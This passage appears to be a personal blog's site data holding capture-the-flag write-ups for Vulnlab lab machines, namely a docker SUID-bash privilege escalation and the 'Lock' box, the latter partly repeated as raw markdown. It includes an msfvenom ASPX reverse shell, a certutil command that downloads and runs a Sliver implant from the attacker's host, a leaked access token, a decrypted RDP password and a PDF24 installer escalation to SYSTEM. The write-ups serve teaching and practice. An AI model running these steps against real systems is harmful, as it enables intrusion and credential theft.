pointing towards <code>/dev/root</code>. While this is the location of the mount, the mount itself is pulling the contents of <code>/opt/limesurvey</code> to the <code>/dev/root</code> directory and can be modified through the docker container.</p>\n<p>The location of the mount on our docker container that is connected to <code>/opt/limesurvey</code> is denoted as <code>/var/www/html/survey</code>, which is the base directory of the LimeSurvey service.</p>\n<p>So the exploitation for this seems to be relatively simple. First since I didn’t do it before, we’ll login to the docker container as root due to the <code>limesvc</code> user’s sudo privileges.</p>\n<p>If you run into a <code>sudo</code> error that states you need a proper terminal to read the password, I would usually recommend just creating a proper shell with tools like Python or <code>stty</code>. The issue is that we’re in a docker container and don’t have access to either of those tools - thus I’d recommend using a C2 such as <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> to have it create a proper terminal for you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$ sudo -l</span><br><span class=\"line\">[sudo] password for limesvc: </span><br><span class=\"line\">Matching Defaults entries for limesvc on efaa6f5097ed:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User limesvc may run the following commands on efaa6f5097ed:</span><br><span class=\"line\">    (ALL : ALL) ALL</span><br><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$</span><br><span class=\"line\"></span><br><span class=\"line\">limesvc@efaa6f5097ed:/home/limesvc$ sudo su</span><br><span class=\"line\">root@efaa6f5097ed:/home/limesvc# whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">root@efaa6f5097ed:/home/limesvc#</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Exploiting-Mounted-Root-SUID-Binary\"><a href=\"#Exploiting-Mounted-Root-SUID-Binary\" class=\"headerlink\" title=\"Exploiting Mounted Root-SUID Binary\"></a>Exploiting Mounted Root-SUID Binary</h1><p>So just a brief snippet of how sudo privileges work, our <code>root</code> user has an ID value of 0, in which every default root user will have this privilege ID value set. Our <code>limesvc</code> on our SSH user does not have this ID set to them, and is not allowed to run any values within the context of root.</p>\n<p>However, we do have the privileges of root within our docker container and a way to transfer this file to our host machine. Thus, if we are able to change the contents of a shell binary in our docker container, have it adopt the privileges of root, and adjust the SUID bit of the binary - we should be able to escalate our privileges.</p>\n<p>So first we’ll copy the <code>/bin/bash</code> binary in our docker container to the mounted directory <code>/var/www/html/survey</code>. I’ll also rename the binary to <code>./daz</code>.</p>\n<p><code>root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./daz</code></p>\n<p>We’ll then adjust the SUID bit of the binary using <code>chmod</code>. As context as to what this does - we’re essentially saying to allow all users to be able to run this binary in the context of the root user. That means ANY user will be able to run this as root.</p>\n<p><code>root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./daz</code></p>\n<p>Now, we should be able to go back to our SSH session and verify that the file is there.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz</span><br><span class=\"line\">-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see now that this file is owned by root, but we’ll still be able to run it as our current user. If we run it with the <code>-p</code> option (which stands for privileged mode), it should generate a session for us as root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz</span><br><span class=\"line\">-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz</span><br><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ./daz -p</span><br><span class=\"line\">daz-5.1# whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">daz-5.1#</span><br></pre></td></tr></table></figure>\n\n<p>And that’s it! The root flag is within <code>/root/root.txt</code>, and thus we have completed this machine.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to xct for creating this machine, it was very fun and helped strengthen some post-exploitation methodologies that I had experienced briefly in the past. The LimeSurvey installation was also really interesting and helped with some brainstorming into the attack path.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\">https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/</a><br><a href=\"https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\">https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&amp;text=To%20create%20a%20new%20user,localhost&#39;%20IDENTIFIED%20BY%20&#39;password&#39;%3B</a><br><a href=\"https://github.com/Y1LD1R1M-1337/Limesurvey-RCE\">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a><br><a href=\"https://github.com/cdk-team/CDK\">https://github.com/cdk-team/CDK</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a></p>\n"},{"title":"Lock - Vulnlab","date":"2024-06-05T18:02:43.000Z","keywords":"Vulnlab, Easy, Windows","description":"This is the last writeup I have documented for all of the Easy machines as of 6/3. This machine in particular is related to Gitea, a web-application that we've pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.","cover":"/images/vulnlab/lock-vl/lock_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis is the last writeup I have documented for all of the Easy machines as of 6/3. This machine in particular is related to Gitea, a web-application that we've pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.\n\n# Enumeration\n\nLet's start with our usual NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 17:05 EDT\nNmap scan report for 10.10.82.24\nHost is up (0.11s latency).\nNot shown: 65529 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3000/tcp open  ppp\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 607.91 seconds\n```\n\nThere seems to be an SMB server, however null authentication does not allow us to view the service. This means we'll need credentials if we want to access this service.\n\nThere is a web server running on port 80, so we'll take a look at that to see what we can find.\n\n![](/images/vulnlab/lock-vl/b.png)\n\nWe seem to be within a basic IIS website that use Lightbox and AOS JS. The web framework for this is Microsoft ASP.NET, indicating to us that this machine is a Windows server.\n\nI ran a directory enumeration scan as described below, however no pertinent results seem to return.\n\n```\n└─$ gobuster dir -u http://10.10.82.24 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n......\n/assets               (Status: 301) [Size: 149] [--> http://10.10.82.24/assets/]\n```\n\nThere is however an `/assets` folder that is returned that we do not have access to. Attempting to follow the redirect will bring you to a `403` error, indicating that we do not have the correct authorization to view this page.\n\n![](/images/vulnlab/lock-vl/c.png)\n\nLet's move onto port 3000. I've dealt with this port a few times before for these writeups on VulnLab, and you can find information about this specific port [here](https://www.speedguide.net/port.php?port=3000). There are a variety of different web applications that can be hosted on this port, and we've dealt with Gitea and Grafana in the past.\n\nAccessing this port through HTTP seems to bring us to another familiar site - Gitea.\n\n![](/images/vulnlab/lock-vl/d.png)\n\nThe only difference in our case for this machine is that there is no register option, as there was for Build. That being said, we can run another `gobuster` scan on this port to determine if there are any resources that we can access.\n\n```\n/admin                (Status: 303) [Size: 38] [--> /user/login]\n/issues               (Status: 303) [Size: 38] [--> /user/login]\n/v2                   (Status: 401) [Size: 50]\n/explore              (Status: 303) [Size: 41] [--> /explore/repos]\n/administrator        (Status: 200) [Size: 16427]\n```\n\nWe seem to receive a 200 request on `/administrator`, along with the indication of a potential API on `/v2`. If we attempt to access `/administrator`, it seems that Gitea authenticates us to the web service. This more than likely is a misconfiguration that shouldn't be here, but nonetheless we were able to access the internal resources for Gitea.\n\nIf you visit the `Explore` tab, you'll see that there is a repository for ellen.freeman denoted as `dev-scripts`. Accessing this will give us the ability to view a Python file denoted as `repos.py`.\n\nFollowing the file seems to bring us to a Python script that is affiliated with the API. The script is attempting to receive a repository based on the domain name of the machine and retrieves a Git access token to check authentication for the current user. The script then parses the users repositories on GITEA before executing the script.\n\nYou'll notice though from the main branch of the repository that there are two commits to this branch. We are currently viewing the most recent commit, however if we view the first commit to this branch we'll find some interesting information.\n\n```\nimport requests\nimport sys\n\nPERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'\nimport os\n......\n```\n\nThere seems to be a personal Git access token on the first commit for the file. This was more than likely the case of a user putting this here temporarily before making the proper commits to the update main file. We can guess that the user forgot to delete our ability to view this commit - which lead to our visibility of it. We'll cache this in the meanwhile as we continue to enumerate into the machine more.\n\nIf you go back to the main file, you'll see that there's a path to the API denoted as `/api/v1/user/repos`. I'm going to assume that this specifically is related to the GITEA website that we're on, however there's the potential for it to be linked to the main website.\n\n![](/images/vulnlab/lock-vl/e.png)\n\nThe API seems to tell us that a token is required, and references us to another directory denoted as `/api/swagger`. Let's try to access this to retrieve the necessary token required.\n\n![](/images/vulnlab/lock-vl/f.png)\n\nThis brings us to the Gitea API, which seems to have all the web resources that Gitea uses in terms of authorization and request management. We have various tabs here denoted for administration, the specific user information, repository information, and many more.\n\nI did some research into the Gitea API and it seems that there is some information regarding the API and token generation. You can find the source I used for this [here](https://docs.gitea.com/next/development/api-usage). Given what we know based on the research, it seems as though we can use cURL for this functionality. Note at this point I did take a break, so the IP addresses may change.\n\nI looked into this API functionality for quite some time, however I couldn't manage to use it for really anything. It seems like we have the ability to execute a function to receive a token, but our authorization seems to be invalid. After a bit of continuous messing around with next to no progress, I deduced this to be a rabbit hole.\n\n# Reversing the Git Repo\n\nI want to turn our attention back to the Git repository that we found earlier. We have a GITEA access token, meaning we can potentially push to the branch of the repositories that we have access to. For `ellen.freeman`, you could only see the `dev-scripts` repository. However, let's take a look at this at command-line as you'll find something a bit odd.\n\n```\n└─$ git clone http://10.10.69.193:3000/ellen.freeman/dev-scripts.git\n```\n\nIf we examine the code a bit again, you'll see that we need two parameters for this. The first is ensuring that our GITEA_ACCESS_TOKEN environment variable is set to an access token that we own. As you already know, we have access to `ellen.freeman`'s token. The second parameter that is needed is the link to the GITEA instance on port `3000`.\n\nLet's also be sure to set the GITEA_ACCESS_TOKEN global variable to ensure that if there is any authentication required, we can access the machine properly. `export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f`\n\n```\n└─$ python repos.py http://10.10.69.193:3000\n/home/daz/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.9) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported \"\nRepositories:\n- ellen.freeman/dev-scripts\n- ellen.freeman/website\n```\n\nIt seems that there is another repository that was returned that wasn't originally in the GITEA interface, being `website`. This repo seems to be unpublished from the GITEA instance, as if you attempt to access it on the web server it will return a 404.\n\nThough we aren't able to see this repository, we can assume that if we were authenticated as `ellen.freeman`, we would be able to see it on our end. We can try to configure our Git authorization locally using the access token and download the repository remotely.\n\n```\n└─$ git config --global http.extraHeader \"Authorization: token $GITEA_ACCESS_TOKEN\"\n\n└─$ git clone http://10.10.69.193:3000/ellen.freeman/website                       \nCloning into 'website'...\nremote: Enumerating objects: 165, done.\nremote: Counting objects: 100% (165/165), done.\nremote: Compressing objects: 100% (128/128), done.\nremote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0\nReceiving objects: 100% (165/165), 7.16 MiB | 1.00 MiB/s, done.\nResolving deltas: 100% (35/35), done.\n```\n\nIt seems that there is a file within this denoted as `readme.md` and it contains the following information.\n\n```\n# New Project Website\n\nCI/CD integration is now active - changes to the repository will automatically be deployed to the webserver\n```\n\nThis indicates to me that any changes to this repository automatically change the website that is being hosted from it. If you'll look at the `index.html` page that is within this directory, you'll find the HTML of the website we were previously on. This also contains the assets folder that we previously did not have access to.\n\nWith what this readme note is telling us, if we are able to commit to this repository, it should automatically deploy to the website on port 80. Thus, if we are able to add a reverse shell to this website, we may be able to receive a session on the website.\n\nIn that case, we'll create a reverse shell with [MSFVenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom). I've found more luck utilizing an ASPX reverse shell on websites that run IIS, so we'll go with that extension.\n\nOne thing you can do to confirm our above theory is attempt to access `changelog.txt` on the main website. It should return the same text file that we have in our cloned git repository locally.\n\n![](/images/vulnlab/lock-vl/g.png)\n\n# RCE via Git Commits\n\nSo let's start by creating an ASPX reverse shell with MSFVenom.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f aspx > daz.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of aspx file: 2906 bytes\n```\n\nWe'll now put our reverse shell within the same directory as the website assets, if it wasn't already.\n\nYou'll see that there is no need for us to initialize this git repository, as the folder has already been preconfigured if you run `ls -la`. The `.git` submodule indicates that to us.\n\n```\n└─$ ls -la \ntotal 44\ndrwxrwxr-x 4 daz daz  4096 Jun  3 21:31 .\ndrwxrwxr-x 4 daz daz  4096 Jun  3 21:23 ..\ndrwxrwxr-x 8 daz daz  4096 Jun  3 21:23 .git\ndrwxrwxr-x 6 daz daz  4096 Jun  3 21:23 assets\n-rw-rw-r-- 1 daz daz    43 Jun  3 21:23 changelog.txt\n-rw-rw-r-- 1 daz daz  2906 Jun  3 21:32 daz.aspx\n-rw-rw-r-- 1 daz daz 15708 Jun  3 21:23 index.html\n-rw-rw-r-- 1 daz daz   130 Jun  3 21:23 readme.md\n```\n\nNext, we can add all of the new additions to the repository (being our reverse shell and the README.md file) and commit them to the branch. We will then push to the main branch and the files should be uploaded correctly.\n\n```\n└─$ git add -A; git commit -m \"DaZ Commit 1\"\n\n└─$ git push origin main                    \nEnumerating objects: 4, done.\nCounting objects: 100% (4/4), done.\nDelta compression using up to 4 threads\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 1.32 KiB | 1.32 MiB/s, done.\nTotal 3 (delta 1), reused 0 (delta 0), pack-reused 0\nremote: . Processing 1 references\nremote: Processed 1 references in total\nTo http://10.10.69.193:3000/ellen.freeman/website\n   73cdcc1..9dac976  main -> main\n```\n\nBefore we execute the file, we'll start up `msfconsole` and configure the listener based on our payload. We're using a meterpreter payload, so we'll need to set that up in `exploit/multi/handler`.\n\n```\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 10.8.0.173\nLHOST => 10.8.0.173\nmsf6 exploit(multi/handler) > set LPORT 9001\nLPORT => 9001\n\nmsf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 10.8.0.173:9001\n```\n\nNote that my IP address adjust due to some conflictions I was having with the website - I made sure to reload the machine and it worked fine. The new IP address is `10.10.66.232`. Now that's finished, we'll access the website to execute our payload. We can simply curl the payload from our terminal in order to execute it. `curl http://10.10.66.232`.\n\n```\n[*] Command shell session 1 opened (10.8.0.173:9001 -> 10.10.66.232:49892) at 2024-06-03 22:24:55 -0400\n\nShell Banner:\nMicrosoft Windows [Version 10.0.20348.2159]\n-----\nc:\\windows\\system32\\inetsrv>\n```\n\n# Reconnaissance on Host\n\nNow that we have access to the machine, we can look around to see if there's any files that will return any valid information. We're currently running as `inetsrv`, meaning we'll need to compromise a user in order to progress any further.\n\nI set up a Sliver C2 server on this machine to ensure that we could access the resources to and from relatively easily. I normally use Havoc on Windows machines, though as you can see there is no AV enabled on this machine.\n\n```\nPS C:\\Gitea\\data> \"Invoke-Mimikatz\"\n\"Invoke-Mimikatz\"\nInvoke-Mimikatz\n```\n\nYou can curl the Sliver implant after creating it to the machine by using `certutil.exe`.\n\n```\nPS C:\\temp> certutil.exe -urlcache -f http://10.8.0.173:9002/lock.exe lock.exe; .\\lock.exe\n```\n\nThere seems to be a decent amount of programs installed on the machine, however you'll notice that there are two users within `C:\\Users`.\n\n```\n    Directory: C:\\Users\n\nMode                 LastWriteTime         Length Name                                           \n----                 -------------         ------ ----   \nd-----        12/27/2023   2:00 PM                .NET v4.5                                      \nd-----        12/27/2023   2:00 PM                .NET v4.5 Classic\nd-----        12/27/2023  12:01 PM                Administrator    \nd-----        12/28/2023  11:36 AM                ellen.freeman  \nd-----        12/28/2023   6:14 AM                gale.dekarios  \nd-r---        12/27/2023  10:21 AM                Public\n```\n\nWhat's interesting is that we have access to `ellen.freeman`'s home directory. While there isn't a flag in this user's home directory, there is an interesting file in their home directory.\n\n```\nPS C:\\Users\\ellen.freeman\\Documents> cat config.xml\ncat config.xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp\" ConfVersion=\"2.6\">\n<Node Name=\"RDP/Gale\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\"\n......\n```\n\nYou'll see that this is an XML file containing the password information for the user `Gale.Dekarios`. This was the other user within `C:\\Users` aside from `ellen.freeman`.\n\nThe file itself seems to be related to `mRemoteNG` and also having an affiliation with RDP. Assuming that we are able to crack the hash within this XML, we could login as this user.\n\n# Decrypting mRemoteNG Hashes\n\nI did a bit of research into mRemoteNG, and it seems to be an application that function relatively similarly to RDP. Our application at hand is a fork of mRemote, which is an open-source remote connection manager for Windows. This specific application supports protocols such as RDP, VNC, SSH, and may more. You can find documentation related to mRemoteNG [here](https://mremoteng.readthedocs.io/en/v1.77.3-dev/).\n\nI also found a repository that contains a decryption script for mRemoteNG specifically. You can find that [here](https://github.com/gquere/mRemoteNG_password_decrypt). Note that if it now prompting you to enter credentials when you clone the repository, that is due to the fact that a `.gitconfig` file was created in your home directory when we were exploiting Gitea earlier. You can delete this `.gitconfig` file to prevent it for prompting you for credentials.\n\nThe script itself seems to be utilizing AES and PBKDF2_HMAC_SHA1 decryption in order to retrieve the plaintext password. The script uses the salt specified in `config.xml` and Base64 decoding in order to decrypt the password.\n\nLet's download this config file containing the credentials to our machine and run the script against it.\n\n```\n└─$ python3 mRemoteNG_password_decrypt/mremoteng_decrypt.py config.xml  \nName: RDP/Gale\nHostname: Lock\nUsername: Gale.Dekarios\nPassword: [...snip...]\n```\n\nIt seems as though the password was decrypted successfully! We should be able to log in as `Gale.Dekarios` through RDP, given that mRemoteNG supports RDP as a protocol.\n\n```\n└─$ xfreerdp /v:10.10.66.232 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6\n```\n\n![](/images/vulnlab/lock-vl/h.png)\n\n# Exploiting PDF24\n\nThe user flag is located within the user's Desktop directory, as you can see from the landing page for RDP. Given that we have this user flag now, we'll need to exploit something in order to gain elevated privileges to Administrator.\n\nLet's check our privileges in order to determine whether or not we can exploit any misconfigured privileges for this user.\n\n```\nPS C:\\Users\\gale.dekarios> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nWe don't have any privileges aside from the default privileges that are given to regular users.\n\nOne of the key thought processes I use for privilege escalation against Windows is understanding the three types of ways that privilege escalation can be obtained. This can be achieved either by **exploiting misconfigured privileges**, **exploiting LDAP objects**, and **exploiting internal applications**. Given that we don't have any way to exploit the first two, let's look around for any applications that are installed.\n\nImmediately on the home screen, you'll notice that there's an odd application installed called PDF24. The interesting part about this file is not in the application itself, but the fact that there is a hidden installation directory with the installer to this application on the machine.\n\n![](/images/vulnlab/lock-vl/i.png)\n\nLet's do some research into this binary and see if there are any ways that we could potentially exploit it.\n\nAlmost immediately, I found a local privilege escalation vulnerability to PDF24 through the installer that I had referred to before. You can find information about that [here](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.).\n\nIt seems as though the MSI installer of this application is vulnerable to a local privilege escalation vulnerability, which can only be achieved with GUI access. Given that we have RDP access, this presents itself as a valid attack path for us to receive SYSTEM. The exploit works when using the repair function with `msiexec.exe`, as a SYSTEM level command shell is utilized in order to suffice the installation process.\n\nDuring the installation, we can utilize a tool called [SetOpLock](https://github.com/googleprojectzero/symboliclink-testing-tools). This is within the `symbolic-testing-tools` suite that seems to be a relatively normal application. This application could be vulnerable to AV, however it does not seem to be an issue in our case since AV is enabled.\n\nTo explain as to what this binary will do, it will essentially create a breakpoint on the opcode where `PDF24-PrinterInstall.exe` is called. The reason for this is that a SYSTEM shell is spawned by the machine in order to install this specific portion, and if we are able to pause the shell at the moment it is called, we can exploit the shell to exploit commands for us. This should lead to us getting access to the shell with SYSTEM privileges.\n\nSo with that, let's compile the executable with Visual Studio and transfer it to our Kali machine, then finally to the RDP session. I did this locally, though if you are running WSL or any alternative with Windows you should be able to exploit this without needing to transfer this through SSH to your Kali machine. Make sure to build the `Release/x64` version of this binary so it works correctly.\n\nLet's first run the installation as directed in the article.\n\n```\nPS C:\\_install> .\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" r\n```\n\nAfter the installation process starts up, run the below command to execute the oplock hang. If it is working successfully, you should NOT receive an output.\n\n```\nPS C:\\_install> .\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" r\n```\n\nDuring the end of this process, you'll see a SYSTEM shell pop up. If this SYSTEM shell remains on the screen, that means the opcode lock worked correctly. However, if the SYSTEM shell pops up for a brief moment and goes away, then there was some form of error with the binary.\n\n![](/images/vulnlab/lock-vl/j.png)\n\nWe now technically have a SYSTEM shell, though we don't have any way to type anything. If we continue to follow the article, we can use Firefox to launch a SYSTEM shell based on the context of the frozen shell currently in front of us.\n\nFirst, right-click on the top bar of the command shell window. This should bring up a small details interface.\n\nThen, we'll select properties to view the current properties of the shell.\n\nWe'll then select the the `legacy console mode` hyperlink towards the bottom of the properties pane. This should open up a Firefox session in the context of SYSTEM.\n\nWithin Firefox, we can now press the hotkey `Ctrl + O` to open up the filesystem. Remember, we are still running this in the context of SYSTEM.\n\nFinally, type `cmd.exe` into the search bar, which should save `cmd.exe` locally and allow you to run it by clicking on it in the `Downloads pane`.\n\nIf all was done correctly, you should have a shell as SYSTEM!\n\n![](/images/vulnlab/lock-vl/k.png)\n\nNow that we have access to this machine as SYSTEM, we essentially have control over the entirety of the machine and all of its files. We should be able to access the root flag in `C:\\Users\\Administrator\\Desktop\\root.txt`. This means we have successfully compromised this machine!\n\n![](/images/vulnlab/lock-vl/l.png)\n\n# Conclusion\n\nThis machine was very entertaining, especially the PDF24 local privilege escalation portion. The fact that setting the opcode perfectly at the only point in time where a SYSTEM shell was executed made perfect sense logically. Furthermore, the start of the machine really tests your ability to prevent going down rabbit holes. This is a nice change of pace, and don't forget to test EVERYTHING out and don't hang on something for too long! Big thanks to xct and kozie for the development of this machine.\n\n# Resources\n\nhttps://www.speedguide.net/port.php?port=3000\nhttps://docs.gitea.com/next/development/api-usage\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\nhttps://mremoteng.readthedocs.io/en/v1.77.3-dev/\nhttps://github.com/gquere/mRemoteNG_password_decrypt\nhttps://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.\nhttps://github.com/googleprojectzero/symboliclink-testing-tools","source":"_posts/lock.md","raw":"---\ntitle: Lock - Vulnlab\ndate: 2024-06-05 14:02:43\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: This is the last writeup I have documented for all of the Easy machines as of 6/3. This machine in particular is related to Gitea, a web-application that we've pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.\ncover: /images/vulnlab/lock-vl/lock_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis is the last writeup I have documented for all of the Easy machines as of 6/3. This machine in particular is related to Gitea, a web-application that we've pen-tested before on our writeup of Build. This then follows a really intuitive exploit of a PDF application by creating a breakpoint at a specific opcode for privilege escalation.\n\n# Enumeration\n\nLet's start with our usual NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 17:05 EDT\nNmap scan report for 10.10.82.24\nHost is up (0.11s latency).\nNot shown: 65529 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3000/tcp open  ppp\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 607.91 seconds\n```\n\nThere seems to be an SMB server, however null authentication does not allow us to view the service. This means we'll need credentials if we want to access this service.\n\nThere is a web server running on port 80, so we'll take a look at that to see what we can find.\n\n![](/images/vulnlab/lock-vl/b.png)\n\nWe seem to be within a basic IIS website that use Lightbox and AOS JS. The web framework for this is Microsoft ASP.NET, indicating to us that this machine is a Windows server.\n\nI ran a directory enumeration scan as described below, however no pertinent results seem to return.\n\n```\n└─$ gobuster dir -u http://10.10.82.24 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n......\n/assets               (Status: 301) [Size: 149] [--> http://10.10.82.24/assets/]\n```\n\nThere is however an `/assets` folder that is returned that we do not have access to. Attempting to follow the redirect will bring you to a `403` error, indicating that we do not have the correct authorization to view this page.\n\n![](/images/vulnlab/lock-vl/c.png)\n\nLet's move onto port 3000. I've dealt with this port a few times before for these writeups on VulnLab, and you can find information about this specific port [here](https://www.speedguide.net/port.php?port=3000). There are a variety of different web applications that can be hosted on this port, and we've dealt with Gitea and Grafana in the past.\n\nAccessing this port through HTTP seems to bring us to another familiar site - Gitea.\n\n![](/images/vulnlab/lock-vl/d.png)\n\nThe only difference in our case for this machine is that there is no register option, as there was for Build. That being said, we can run another `gobuster` scan on this port to determine if there are any resources that we can access.\n\n```\n/admin                (Status: 303) [Size: 38] [--> /user/login]\n/issues               (Status: 303) [Size: 38] [--> /user/login]\n/v2                   (Status: 401) [Size: 50]\n/explore              (Status: 303) [Size: 41] [--> /explore/repos]\n/administrator        (Status: 200) [Size: 16427]\n```\n\nWe seem to receive a 200 request on `/administrator`, along with the indication of a potential API on `/v2`. If we attempt to access `/administrator`, it seems that Gitea authenticates us to the web service. This more than likely is a misconfiguration that shouldn't be here, but nonetheless we were able to access the internal resources for Gitea.\n\nIf you visit the `Explore` tab, you'll see that there is a repository for ellen.freeman denoted as `dev-scripts`. Accessing this will give us the ability to view a Python file denoted as `repos.py`.\n\nFollowing the file seems to bring us to a Python script that is affiliated with the API. The script is attempting to receive a repository based on the domain name of the machine and retrieves a Git access token to check authentication for the current user. The script then parses the users repositories on GITEA before executing the script.\n\nYou'll notice though from the main branch of the repository that there are two commits to this branch. We are currently viewing the most recent commit, however if we view the first commit to this branch we'll find some interesting information.\n\n```\nimport requests\nimport sys\n\nPERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'\nimport os\n......\n```\n\nThere seems to be a personal Git access token on the first commit for the file. This was more than likely the case of a user putting this here temporarily before making the proper commits to the update main file. We can guess that the user forgot to delete our ability to view this commit - which lead to our visibility of it. We'll cache this in the meanwhile as we continue to enumerate into the machine more.\n\nIf you go back to the main file, you'll see that there's a path to the API denoted as `/api/v1/user/repos`. I'm going to assume that this specifically is related to the GITEA website that we're on, however there's the potential for it to be linked to the main website.\n\n![](/images/vulnlab/lock-vl/e.png)\n\nThe API seems to tell us that a token is required, and references us to another directory denoted as `/api/swagger`. Let's try to access this to retrieve the necessary token required.\n\n![](/images/vulnlab/lock-vl/f.png)\n\nThis brings us to the Gitea API, which seems to have all the web resources that Gitea uses in terms of authorization and request management. We have various tabs here denoted for administration, the specific user information, repository information, and many more.\n\nI did some research into the Gitea API and it seems that there is some information regarding the API and token generation. You can find the source I used for this [here](https://docs.gitea.com/next/development/api-usage). Given what we know based on the research, it seems as though we can use cURL for this functionality. Note at this point I did take a break, so the IP addresses may change.\n\nI looked into this API functionality for quite some time, however I couldn't manage to use it for really anything. It seems like we have the ability to execute a function to receive a token, but our authorization seems to be invalid. After a bit of continuous messing around with next to no progress, I deduced this to be a rabbit hole.\n\n# Reversing the Git Repo\n\nI want to turn our 